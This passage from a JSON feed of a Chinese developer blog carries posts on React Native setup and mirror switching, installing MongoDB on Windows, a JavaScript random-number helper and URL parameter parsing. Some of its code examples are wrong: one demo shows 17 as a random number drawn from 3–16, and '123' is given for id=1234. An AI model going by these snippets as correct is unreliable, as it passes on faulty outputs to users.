Chrome 浏览器团队做了很多努力。他们认为, Web App 足以满足大多数 App 的需求, 但是三大缺陷阻碍它的推广。</p>\n<ol>\n<li>不能从手机的首屏直接进入。</li>\n<li>缺乏手机状态栏和锁屏时的通知推送能力。</li>\n<li>不支持脱机访问（即断网也能使用）。</li>\n</ol>\n<h2 id=\"hybrid-app\" tabindex=\"-1\"> Hybrid APP</h2>\n<div><p>定义</p>\n<p>Hybrid App, 基于第三方跨平台移动应用引擎框架进行开发。使用 HTML5 和 JS 作为开发, 调用引擎封装的底层功能如照相机、传感器、通讯录等。其具有 Native App 良好用户交互体验的优势, 同时, 具有 Web App 跨平台开发的优势。</p>\n</div>\n",
      "date_published": "2020-01-23T09:42:39.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "app"
      ]
    },
    {
      "title": "React Native 填坑指南",
      "url": "https://vxhly.github.io/views/app/react-native-filling-guide.html",
      "id": "https://vxhly.github.io/views/app/react-native-filling-guide.html",
      "summary": "前言\n开始学习 React Native, 期间也遇上了许多坑, 本篇将在官方文档基础上补充一些填坑的指南。\n\n",
      "content_html": "<div><p>前言</p>\n<p>开始学习 React Native, 期间也遇上了许多坑, 本篇将在官方文档基础上补充一些填坑的指南。</p>\n</div>\n\n<h2 id=\"官方文档\" tabindex=\"-1\"> 官方文档</h2>\n<p><a href=\"https://reactnative.cn/\" target=\"_blank\" rel=\"noopener noreferrer\">React Native 官方文档</a></p>\n<h2 id=\"搭建开发环境\" tabindex=\"-1\"> 搭建开发环境</h2>\n<div><p>提示</p>\n<p>这里并不推荐大家使用沙箱环境。沙盒环境大量依赖于国外网络环境, 也不能直接安装第三方原生组件。不建议国内用户使用。</p>\n</div>\n<p>这一步及其重要, 多数人都会卡在这一步, 包括博主也是在这一步也是卡了很久, 开发环境搭建好了一定会事半功倍, 接下的内容将会带领你少走弯路。</p>\n<h3 id=\"搭建前请换源\" tabindex=\"-1\"> 搭建前请换源</h3>\n<p>使用过 Node.js 开发项目的都知道我们的 Node.js 项目在安装项目依赖时受限于国内的网络环境, 并不能快速的下载项目依赖, 接下几个步骤教你换源</p>\n<p>首先是 <code>yarn</code> 和 <code>npm</code> 的软件源, 使用到的是 <code>cgr</code> 这个命令来快速的切源</p>\n<div><pre><code><span>npm</span> i -g cgr\ncgr use taobao <span># 此命令可以同时切换 yarn 和 npm 的软件源</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>当然也可以使用以下命令来快速的切源</p>\n<div><pre><code><span>npm</span> config <span>set</span> registry https://registry.npm.taobao.org --global\n<span>npm</span> config <span>set</span> disturl https://npm.taobao.org/dist --global\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>在开发 IOS 的应用时还需切换 CocoaPods 镜像, 可以参照 <a href=\"https://mirrors.tuna.tsinghua.edu.cn/help/CocoaPods/\" target=\"_blank\" rel=\"noopener noreferrer\">CocoaPods 镜像使用帮助</a> 进行切源</p>\n<div><pre><code><span>cd</span> ~/.cocoapods/repos\npod repo remove master\n<span>git</span> clone https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git master\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>MacOS 下建议还需更换 brew 的软件源, 可以参照 <a href=\"https://developer.aliyun.com/mirror/homebrew\" target=\"_blank\" rel=\"noopener noreferrer\">阿里云的镜像源</a> 进行切源</p>\n<p>Bash 终端配置</p>\n<div><pre><code><span># 替换brew.git:</span>\n<span>cd</span> <span>\"<span><span>$(</span>brew --repo<span>)</span></span>\"</span>\n<span>git</span> remote set-url origin https://mirrors.aliyun.com/homebrew/brew.git\n<span># 替换homebrew-core.git:</span>\n<span>cd</span> <span>\"<span><span>$(</span>brew --repo<span>)</span></span>/Library/Taps/homebrew/homebrew-core\"</span>\n<span>git</span> remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git\n<span># 应用生效</span>\nbrew update\n<span># 替换homebrew-bottles:</span>\n<span>echo</span> <span>'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles'</span> <span>>></span> ~/.bash_profile\n<span>source</span> ~/.bash_profile\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>Zsh 终端配置</p>\n<div><pre><code><span># 替换brew.git:</span>\n<span>cd</span> <span>\"<span><span>$(</span>brew --repo<span>)</span></span>\"</span>\n<span>git</span> remote set-url origin https://mirrors.aliyun.com/homebrew/brew.git\n<span># 替换homebrew-core.git:</span>\n<span>cd</span> <span>\"<span><span>$(</span>brew --repo<span>)</span></span>/Library/Taps/homebrew/homebrew-core\"</span>\n<span>git</span> remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git\n<span># 应用生效</span>\nbrew update\n<span># 替换homebrew-bottles:</span>\n<span>echo</span> <span>'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles'</span> <span>>></span> ~/.zshrc\n<span>source</span> ~/.zshrc\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>绝对禁止</p>\n<p>windows 环境下不使用 cnpm 就好, cnpm 安装的模块路径比较奇怪, packager 不能正常识别！</p>\n</div>\n<h3 id=\"安装依赖和运行\" tabindex=\"-1\"> 安装依赖和运行</h3>\n<div><p>提示</p>\n<p>安装依赖这边不做重复声明, 官方文档已经非常详细了</p>\n</div>\n<div><p>坑</p>\n<p>React Native 运行时将监听 8081 端口, 所以 8081 端口绝对不能被占用, 否则会导致编译失败等问题</p>\n<p>当然如果是因为这个引起的编译失败也不要慌, 将你的 8081 端口占用的进程关掉即可</p>\n<div><pre><code><span>lsof</span> -i tcp:8081\n<span>kill</span> <span>[</span>pid<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div></div>\n<h2 id=\"开发填坑\" tabindex=\"-1\"> 开发填坑</h2>\n<h3 id=\"导入-iconfont-自定义图标库\" tabindex=\"-1\"> 导入 IconFont 自定义图标库</h3>\n<p>参考 <a href=\"https://github.com/iconfont-cli/react-native-iconfont-cli\" target=\"_blank\" rel=\"noopener noreferrer\">react-native-iconfont-cli</a></p>\n<h4 id=\"step-1\" tabindex=\"-1\"> Step 1</h4>\n<p>安装插件</p>\n<div><pre><code><span># Yarn</span>\n<span>yarn</span> <span>add</span> react-native-svg\n<span>yarn</span> <span>add</span> react-native-iconfont-cli --dev\n\n<span># Npm</span>\n<span>npm</span> <span>install</span> react-native-svg\n<span>npm</span> <span>install</span> react-native-iconfont-cli --save-dev\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"step-2\" tabindex=\"-1\"> Step 2</h4>\n<p>静态链接。请注意您使用的 React-Native 版本号</p>\n<div><pre><code><span># RN &lt; 0.60</span>\nreact-native <span>link</span> react-native-svg\n\n<span># RN >= 0.60</span>\n<span>cd</span> ios <span>&amp;&amp;</span> pod <span>install</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"step-3\" tabindex=\"-1\"> Step 3</h4>\n<p>生成配置文件</p>\n<div><pre><code>npx iconfont-init\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"step-4\" tabindex=\"-1\"> Step 4</h4>\n<p>开始生成 React-Native 标准组件</p>\n<div><pre><code>npx iconfont-rn\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "date_published": "2020-07-02T20:58:47.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "app"
      ]
    },
    {
      "title": "Windows 下安装 MongoDB",
      "url": "https://vxhly.github.io/views/design/install-mongodb-on-windwos.html",
      "id": "https://vxhly.github.io/views/design/install-mongodb-on-windwos.html",
      "summary": "前言\nMongoDB 是目前在 IT 行业非常流行的一种非关系型数据库 (NoSql), 其灵活的数据存储方式备受当前 IT 从业人员的青睐。这里主要讲如何在 Windows 平台下安装 MongoDB。\n\n",
      "content_html": "<div><p>前言</p>\n<p>MongoDB 是目前在 IT 行业非常流行的一种非关系型数据库 (NoSql), 其灵活的数据存储方式备受当前 IT 从业人员的青睐。这里主要讲如何在 Windows 平台下安装 MongoDB。</p>\n</div>\n\n<h2 id=\"下载\" tabindex=\"-1\"> 下载</h2>\n<p><a href=\"http://www.mongodb.com/download-center?jmp=nav#community\" target=\"_blank\" rel=\"noopener noreferrer\">MongoDB 官网下载链接</a></p>\n<h2 id=\"手动简单的配置\" tabindex=\"-1\"> 手动简单的配置</h2>\n<h3 id=\"配置环境变量\" tabindex=\"-1\"> 配置环境变量</h3>\n<p>安装成功之后, 将 mongodb 目录下的 bin 目录添加至 path 变量中, 如:</p>\n<p><img src=\"/assets/install-mongodb-1.png\" alt=\"Windows 下安装 MongoDB\"></p>\n<h3 id=\"创建数据库文件存放目录\" tabindex=\"-1\"> 创建数据库文件存放目录</h3>\n<p>创建数据库文件的存放位置, 比如 <code>D:\\mongodb\\data\\db</code> 。启动 mongodb 服务之前需要必须创建数据库文件的存放文件夹, 否则命令不会自动创建, 而且不能启动成功。</p>\n<p><img src=\"/assets/install-mongodb-2.png\" alt=\"Windows 下安装 MongoDB\"></p>\n<p>接下来打开命令行窗口, 切换到 <code>D:\\MongoDB\\bin</code> 目录执行如下命令:</p>\n<div><pre><code>mongod --dbpath D:<span>\\</span>MongoDB<span>\\</span>data<span>\\</span>db <span># 其中 --dbpath 是指定数据库存放目录</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>这是命令行窗口会打印一些启动信息, 最后一行显示为如下信息时表示启动成功了</p>\n<div><pre><code><span>2017</span>-05-29T17:23:16.752+0800 I NETWORK  <span>[</span>thread1<span>]</span> waiting <span>for</span> connections on port <span>27017</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"创建日志文件存放目录\" tabindex=\"-1\"> 创建日志文件存放目录</h3>\n<p>我们需要指定 log 目录, 所以我们创建 log 目录 <code>D:\\MongoDB\\data\\logs\\mongodb.log</code> .</p>\n<div><pre><code>mongod --dbpath D:<span>\\</span>MongoDB<span>\\</span>data<span>\\</span>db --logpath<span>=</span>D:<span>\\</span>MongoDB<span>\\</span>data<span>\\</span>logs<span>\\</span>mongodb.log --logappend\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/install-mongodb-3.png\" alt=\"Windows 下安装 MongoDB\"></p>\n<p>这是命令行窗口会打印一些启动信息, 最后一行显示为如下信息时表示启动成功了</p>\n<div><pre><code><span>2017</span>-05-29T17:23:16.752+0800 I NETWORK  <span>[</span>thread1<span>]</span> waiting <span>for</span> connections on port <span>27017</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装为-windows-服务\" tabindex=\"-1\"> 安装为 Windows 服务</h3>\n<div><pre><code>sc create MongoDB <span>binPath</span><span>=</span> <span>\"D:\\MongoDB<span title=\"\\b\">\\b</span>in\\mongod.exe --service --dbpath D:\\MongoDB\\data\\db --logpath=D:\\MongoDB\\data\\logs\\mongodb.log --logappend\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>启动服务时需要管理员权限</p>\n<div><pre><code>net start MongoDB\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/install-mongodb-4.png\" alt=\"Windows 下安装 MongoDB\"></p>\n<h2 id=\"使用配置文件\" tabindex=\"-1\"> 使用配置文件</h2>\n<p>很遗憾, 官方下载的安装包里面没有默认的配置文件, 若想使用配置文件只能自己建一个了, 另外个人也推荐使用配置文件来管理 MongoDB 的配置, 使用配置文件配置数据库文件、日志文件以及其它的一些配置都一目了然</p>\n<ol>\n<li>解压安装包到 <code>D:\\MongoDB</code></li>\n<li>建立数据库目录 <code>D:\\MongoDB\\data</code></li>\n<li>建立日志目录 <code>D:\\MongoDB\\logs</code></li>\n<li>建立配置文件目录 <code>D:\\MongoDB\\etc</code></li>\n<li>建立配置文件 <code>D:\\MongoDB\\etc\\mongodb.conf</code></li>\n</ol>\n<h3 id=\"配置文件\" tabindex=\"-1\"> 配置文件</h3>\n<div><pre><code><span>dbpath</span><span>=</span>D:<span>\\</span>MongoDB<span>\\</span>data <span># 数据库路径</span>\n<span>logpath</span><span>=</span>D:<span>\\</span>MongoDB<span>\\</span>logs<span>\\</span>mongodb.log <span># 日志输出文件路径</span>\n<span>logappend</span><span>=</span>true <span># 错误日志采用追加模式,配置这个选项后 mongodb 的日志会追加到现有的日志文件,而不是从新创建一个新文件</span>\n<span>journal</span><span>=</span>true <span># 启用日志文件,默认启用</span>\n<span>quiet</span><span>=</span>true <span># 这个选项可以过滤掉一些无用的日志信息,若需要调试使用请设置为 false</span>\n<span>port</span><span>=</span><span>27017</span> <span># 端口号 默认为 27017</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>这里仅指定了几个常用项, 更多详细配置请参考官方文档 <a href=\"https://docs.mongodb.org/manual/reference/configuration-options/\" target=\"_blank\" rel=\"noopener noreferrer\">https://docs.mongodb.org/manual/reference/configuration-options/</a></p>\n<h3 id=\"普通启动\" tabindex=\"-1\"> 普通启动</h3>\n<div><pre><code>mongod --config D:<span>\\</span>MongoDB<span>\\</span>etc<span>\\</span>mongodb.conf\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装为-windows-服务-1\" tabindex=\"-1\"> 安装为 Windows 服务</h3>\n<div><pre><code>mongod --config D:<span>\\</span>MongoDB<span>\\</span>etc<span>\\</span>mongodb.conf --install\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"使用-sc-安装为-windows-服务\" tabindex=\"-1\"> 使用 SC 安装为 Windows 服务</h3>\n<div><pre><code>sc create MongoDB <span>binPath</span><span>=</span> <span>\"D:\\MongoDB<span title=\"\\b\">\\b</span>in\\mongod.exe --service --config=D:\\MongoDB<span title=\"\\e\">\\e</span>tc\\mongodb.conf\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>启动服务时需要管理员权限</p>\n<div><pre><code>net start MongoDB\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"浏览器测试\" tabindex=\"-1\"> 浏览器测试</h3>\n<p>打开浏览器, 访问 <a href=\"http://127.0.0.1:27017/\" target=\"_blank\" rel=\"noopener noreferrer\">http://127.0.0.1:27017/</a> , 显示以下内容表示安装成功<br></p>\n<p><img src=\"/assets/install-mongodb-5.png\" alt=\"Windows 下安装 MongoDB\"></p>\n<h2 id=\"附上-ubuntu-下安装\" tabindex=\"-1\"> 附上 Ubuntu 下安装</h2>\n<p>Ubuntu 下安装非常简单, 执行一条命令就行, 无需任何配置, 执行完后直接使用。</p>\n<div><pre><code><span>sudo</span> <span>apt-get</span> -y <span>install</span> mongodb\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"图形化管理工具\" tabindex=\"-1\"> 图形化管理工具</h2>\n<div><p>工具推荐</p>\n<p>工具推荐推荐图形化管理工具 <a href=\"http://adminmongo.markmoffat.com/\" target=\"_blank\" rel=\"noopener noreferrer\">adminMongo</a></p>\n</div>\n<h3 id=\"环境需求\" tabindex=\"-1\"> 环境需求</h3>\n<ul>\n<li>Node.js(使用 nvm 进行安装)</li>\n<li>pm2( <code>npm -g pm2</code> )</li>\n<li>git</li>\n</ul>\n<h3 id=\"下载-1\" tabindex=\"-1\"> 下载</h3>\n<div><pre><code><span>git</span> clone https://github.com/mrvautin/adminMongo.git\n<span>cd</span> adminMongo <span>&amp;&amp;</span> <span>npm</span> <span>install</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"pm2-启动\" tabindex=\"-1\"> pm2 启动</h3>\n<div><pre><code><span>cd</span> adminMongo\npm2 start app.js\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"访问测试\" tabindex=\"-1\"> 访问测试</h3>\n<p>打开浏览器, 访问 <a href=\"http://127.0.0.1:1234/\" target=\"_blank\" rel=\"noopener noreferrer\">http://127.0.0.1:1234/</a> , 显示以下内容表示安装成功<br></p>\n<p><img src=\"/assets/install-mongodb-6.png\" alt=\"Windows 下安装 MongoDB\"></p>\n<h3 id=\"配置使用\" tabindex=\"-1\"> 配置使用</h3>\n<p>Connection name =&gt; 连接名随意 Connection string =&gt; 连接方法: <code>mongodb://&lt;user&gt;:&lt;password&gt;@127.0.0.1:&lt;port&gt;/&lt;db&gt;</code> Connection options =&gt; 链接选项 <a href=\"http://mongodb.github.io/node-mongodb-native/2.1/reference/connecting/connection-settings/\" target=\"_blank\" rel=\"noopener noreferrer\">docs</a></p>\n<p>连接成功后创建一个数据库进行测试<br></p>\n<p><img src=\"/assets/install-mongodb-7.png\" alt=\"Windows 下安装 MongoDB\"></p>\n<p>随意添加一些数据, 注意数据为 JSON 格式<br></p>\n<p><img src=\"/assets/install-mongodb-8.png\" alt=\"Windows 下安装 MongoDB\"></p>\n",
      "image": "https://vxhly.github.io/assets/install-mongodb-1.png",
      "date_published": "2017-05-29T17:11:30.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "design"
      ]
    },
    {
      "title": "JavaScript 生成随机数",
      "url": "https://vxhly.github.io/views/design/js-generated-random-number.html",
      "id": "https://vxhly.github.io/views/design/js-generated-random-number.html",
      "summary": "前言\n为 JS 中的 Math 对象新增生成不重复随机数方法。\n\n",
      "content_html": "<div><p>前言</p>\n<p>为 JS 中的 Math 对象新增生成不重复随机数方法。</p>\n</div>\n\n<h2 id=\"方法源码一\" tabindex=\"-1\"> 方法源码一</h2>\n<div><pre><code><span>/**\n * Math 对象的扩展方法,可用于生成随机数\n * <span>@param</span>  <span><span>{</span>number<span>}</span></span> <span>startNum</span>  起始数,整型\n * <span>@param</span>  <span><span>{</span>number<span>}</span></span> <span>endNum</span>    终止数,整型\n * <span>@param</span>  <span><span>{</span>number<span>}</span></span> <span>count</span>     生成的个数,整型\n * <span>@param</span>  <span><span>{</span>boolean<span>}</span></span> <span>repeat</span>   是否重复,true or false\n * <span>@return</span> <span><span>{</span>Array<span>}</span></span>            返回数组\n */</span>\nMath<span>.</span><span>randNum</span> <span>=</span> <span>function</span> <span>(</span><span>startNum<span>,</span> endNum<span>,</span> count<span>,</span> repeat</span><span>)</span> <span>{</span>\n  <span>if</span> <span>(</span>repeat<span>)</span> <span>{</span>\n    <span>var</span> ret <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>)</span><span>;</span>\n    <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> count<span>;</span> i<span>++</span><span>)</span> <span>{</span>\n      <span>// 生成区间范围内的随机数</span>\n      ret<span>[</span>i<span>]</span> <span>=</span> Math<span>.</span><span>floor</span><span>(</span>Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> <span>(</span>endNum <span>-</span> startNum<span>)</span> <span>+</span> startNum<span>)</span><span>;</span>\n    <span>}</span>\n    <span>return</span> ret<span>;</span>\n  <span>}</span> <span>else</span> <span>{</span>\n    <span>var</span> tmp <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>)</span><span>;</span>\n    <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> <span>;</span> i<span>++</span><span>)</span> <span>{</span>\n      <span>if</span> <span>(</span>tmp<span>.</span>length <span>&lt;</span> count<span>)</span> <span>{</span>\n        <span>// 生成区间范围内的随机数</span>\n        <span>var</span> rand <span>=</span> Math<span>.</span><span>floor</span><span>(</span>Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> <span>(</span>endNum <span>-</span> startNum<span>)</span> <span>+</span> startNum<span>)</span><span>;</span>\n        <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> tmp<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>\n          <span>if</span> <span>(</span>tmp<span>[</span>i<span>]</span> <span>==</span> rand<span>)</span> <span>{</span>\n            <span>// 将生成的随机数进行比对,如果相同则重新生成</span>\n            <span>return</span> Math<span>.</span><span>randNum</span><span>(</span>startNum<span>,</span> endNum<span>,</span> count<span>,</span> repeat<span>)</span><span>;</span>\n          <span>}</span>\n        <span>}</span>\n        <span>// 向数组添加数据</span>\n        tmp<span>.</span><span>push</span><span>(</span>rand<span>)</span><span>;</span>\n      <span>}</span> <span>else</span> <span>{</span>\n        <span>break</span><span>;</span>\n      <span>}</span>\n    <span>}</span>\n    <span>return</span> tmp<span>;</span>\n  <span>}</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"如何调用\" tabindex=\"-1\"> 如何调用</h3>\n<div><pre><code>Math<span>.</span><span>randNum</span><span>(</span>number<span>,</span> number<span>,</span> number<span>,</span> <span>true</span> <span>|</span> <span>false</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"demo1\" tabindex=\"-1\"> demo1</h3>\n<p>控制台代码</p>\n<div><pre><code>console<span>.</span><span>log</span><span>(</span>Math<span>.</span><span>randNum</span><span>(</span><span>3</span><span>,</span> <span>16</span><span>,</span> <span>5</span><span>,</span> <span>true</span><span>)</span><span>;</span><span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>输出 =&gt; <code>[4, 15, 15, 15, 17]</code></p>\n<h3 id=\"demo2\" tabindex=\"-1\"> demo2</h3>\n<p>控制台代码</p>\n<div><pre><code>console<span>.</span><span>log</span><span>(</span>Math<span>.</span><span>randNum</span><span>(</span><span>3</span><span>,</span> <span>16</span><span>,</span> <span>5</span><span>,</span> <span>false</span><span>)</span><span>;</span><span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>输出 =&gt; <code>[15, 14, 6, 11, 4]</code></p>\n<h2 id=\"方法源码二\" tabindex=\"-1\"> 方法源码二</h2>\n<blockquote>\n<p>一种更简单的写法</p>\n</blockquote>\n<div><pre><code><span>var</span> arr <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>)</span><span>;</span> <span>//新建一个数组</span>\n\n<span>// 向数组赋值 0~100</span>\n<span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;=</span> <span>100</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>\n  arr<span>.</span><span>push</span><span>(</span>i<span>)</span><span>;</span>\n<span>}</span>\n\n<span>// 随机排位</span>\narr<span>.</span><span>sort</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>\n  <span>return</span> <span>0.5</span> <span>-</span> Math<span>.</span><span>random</span><span>(</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n\narr<span>.</span>length <span>=</span> <span>50</span><span>;</span> <span>// 指定数组长度</span>\n\ndocument<span>.</span><span>write</span><span>(</span>arr<span>)</span><span>;</span> <span>// 输出数组</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2016-08-02T13:49:41.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "design"
      ]
    },
    {
      "title": "JavaScript 获取 URL 请求参数",
      "url": "https://vxhly.github.io/views/design/js-get-url-request.html",
      "id": "https://vxhly.github.io/views/design/js-get-url-request.html",
      "summary": "前言\n通过 JavaScript 原生方法, 获取 URL 所带的请求参数备用。\n\n",
      "content_html": "<div><p>前言</p>\n<p>通过 JavaScript 原生方法, 获取 URL 所带的请求参数备用。</p>\n</div>\n\n<h2 id=\"方法一-使用正则表达式匹配\" tabindex=\"-1\"> 方法一(使用正则表达式匹配)</h2>\n<h3 id=\"方法源码\" tabindex=\"-1\"> 方法源码</h3>\n<div><pre><code><span>function</span> <span>GetValue</span><span>(</span><span>name</span><span>)</span> <span>{</span>\n  <span>var</span> reg <span>=</span> <span>new</span> <span>RegExp</span><span>(</span><span>\"(^|&amp;)\"</span> <span>+</span> name <span>+</span> <span>\"=([^&amp;]*)(&amp;|$)\"</span><span>)</span><span>;</span>\n  <span>var</span> r <span>=</span> window<span>.</span>location<span>.</span>search<span>.</span><span>substr</span><span>(</span><span>1</span><span>)</span><span>.</span><span>match</span><span>(</span>reg<span>)</span><span>;</span>\n  <span>if</span> <span>(</span>r <span>!=</span> <span>null</span><span>)</span> <span>return</span> <span>unescape</span><span>(</span>r<span>[</span><span>2</span><span>]</span><span>)</span><span>;</span>\n  <span>return</span> <span>null</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"如何使用\" tabindex=\"-1\"> 如何使用?</h3>\n<p>若地址栏 URL 为: <code>abc.html?id=1234&amp;&amp;url=https://www.baidu.com</code> 则</p>\n<div><pre><code>console<span>.</span><span>log</span><span>(</span><span>GetValue</span><span>(</span><span>\"id\"</span><span>)</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>输出 =&gt; <code>123</code></p>\n<div><pre><code>console<span>.</span><span>log</span><span>(</span><span>GetValue</span><span>(</span><span>\"url\"</span><span>)</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>输出 =&gt; <a href=\"https://www.baidu.com%60\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.baidu.com`</a></p>\n<h2 id=\"方法二-普通字符串截取\" tabindex=\"-1\"> 方法二（普通字符串截取）</h2>\n<h3 id=\"方法源码-1\" tabindex=\"-1\"> 方法源码</h3>\n<div><pre><code><span>function</span> <span>GetRequest</span><span>(</span><span>)</span> <span>{</span>\n  <span>var</span> url <span>=</span> location<span>.</span>search<span>;</span>\n  <span>var</span> theRequest <span>=</span> <span>new</span> <span>Object</span><span>(</span><span>)</span><span>;</span>\n  <span>if</span> <span>(</span>url<span>.</span><span>indexOf</span><span>(</span><span>\"?\"</span><span>)</span> <span>!=</span> <span>-</span><span>1</span><span>)</span> <span>{</span>\n    <span>var</span> str <span>=</span> url<span>.</span><span>substr</span><span>(</span><span>1</span><span>)</span><span>;</span>\n    strs <span>=</span> str<span>.</span><span>split</span><span>(</span><span>\"&amp;\"</span><span>)</span><span>;</span>\n    <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> strs<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>\n      theRequest<span>[</span>strs<span>[</span>i<span>]</span><span>.</span><span>split</span><span>(</span><span>\"=\"</span><span>)</span><span>[</span><span>0</span><span>]</span><span>]</span> <span>=</span> strs<span>[</span>i<span>]</span><span>.</span><span>split</span><span>(</span><span>\"=\"</span><span>)</span><span>[</span><span>1</span><span>]</span><span>;</span>\n    <span>}</span>\n  <span>}</span>\n  <span>return</span> theRequest<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"如何使用-1\" tabindex=\"-1\"> 如何使用?</h3>\n<div><pre><code><span><span><span>&lt;</span>script</span> <span>type</span><span><span>=</span><span>\"</span>text/javascript<span>\"</span></span><span>></span></span><span><span>\n  <span>var</span> Request <span>=</span> <span>new</span> <span>Object</span><span>(</span><span>)</span><span>;</span>\n  Request <span>=</span> <span>GetRequest</span><span>(</span><span>)</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>若地址栏 URL 为: <code>abc.html?id=1234&amp;&amp;url=https://www.baidu.com</code> 则</p>\n<div><pre><code>console<span>.</span><span>log</span><span>(</span>Request<span>[</span><span>\"id\"</span><span>]</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>输出=&gt; <code>123</code></p>\n<div><pre><code>console<span>.</span><span>log</span><span>(</span>Request<span>[</span><span>\"url\"</span><span>]</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>输出 =&gt; &lt;<code>https://www.baidu.com</code>&gt;</p>\n",
      "date_published": "2016-08-07T19:21:58.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "design"
      ]
    },
    {
      "title": "移动端网页自适应方案",
      "url": "https://vxhly.github.io/views/design/layout-project-for-moblie.html",
      "id": "https://vxhly.github.io/views/design/layout-project-for-moblie.html",
      "summary": "前言\n解决移动端网页的自适应, 让开发变得更加简洁。\n\n",
